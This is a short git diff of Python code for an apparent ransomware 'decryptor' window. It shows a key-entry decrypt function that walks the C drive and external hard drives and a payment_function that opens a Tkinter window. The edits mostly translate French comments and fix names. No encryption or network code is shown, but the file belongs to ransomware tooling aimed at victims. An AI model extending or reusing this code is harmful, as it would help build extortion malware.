@@ -11,8 +11,9 @@ main_thread = threading.currentThread()
 # Decrypting function
 def decrypt(key, path):
     """
-    :param key:
-    :param path:
+    Function use to start the decrypting process
+    :param key -- key to decrypt:
+    :param path -- path where are the encrypted files:
     :return:
     """
     # retrieve the key
@@ -26,13 +27,11 @@ def decrypt(key, path):
                                "\nYou are now aware !"):
 
             # Return an encrypt list files and their path
-            # BUG CORRECTION DU CHEMIN -> VOIR FICHIERS HDD EXTERNES
-            # FAIRE LE CHECK !!!!
             encrypt_files_list_C = Crypto_files.list_files(path)
             list_hdd = List_external_HDD.list_hdd_files()
             list_all_files = list_hdd + encrypt_files_list_C
 
-            # Variable de débugging (à retirer plus tard)
+            # Debugging variable (to remove later)
             j = 1
             # Loop through the files
             for encrypt_file in list_all_files:
@@ -55,7 +54,7 @@ def decrypt(key, path):
             # Cancellation of the decrypting process
             showinfo('Cancellation', 'Cancellation...')
     else:
-        # Error message if the key is empty
+        # Error message if the key field is empty
         showinfo('Error', 'Please enter a valid key !')
 
 
@@ -68,7 +67,7 @@ def payment_function(path):
     # Add a title
     main_window.title('Ransomware Decryptor')
     # Load the icon
-    main_window.iconbitmap("icone.ico")
+    main_window.iconbitmap("icon.ico")
 
     # Main window width and height
     l = 365
